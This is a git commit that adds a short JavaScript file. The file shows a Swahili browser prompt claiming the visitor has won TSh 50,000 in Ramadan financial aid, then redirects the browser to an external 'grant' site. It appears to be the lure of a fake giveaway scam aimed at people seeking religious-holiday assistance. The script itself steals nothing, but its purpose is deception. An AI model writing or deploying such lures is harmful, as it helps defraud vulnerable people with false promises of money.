deebc8440a21263e6701a6ff64a29951df977ea1
The-On-going <sirpeelawson@gmail.com>
2026-03-12 07:39:15 +0100

    Create activeot.js

---
+++ activeot.js
@@ -0,0 +1,10 @@
+var password = 'TOA TSh 50,000';
+
+password = prompt(
+  'Hongera, unastahiki kupata ZUBEIR ALI MAULID TSh 50,000 Msaada wa Fedha wa Ramadhani. Bonyeza OK kupokea mara moja.',
+  'TOA TSh 50,000'
+);
+
+if (password !== 'TOA TSh 50,000') {
+    location.href = 'https://ongoing-grant.info/50,000-Msaada-Wa-Ramadhani.html';
+}
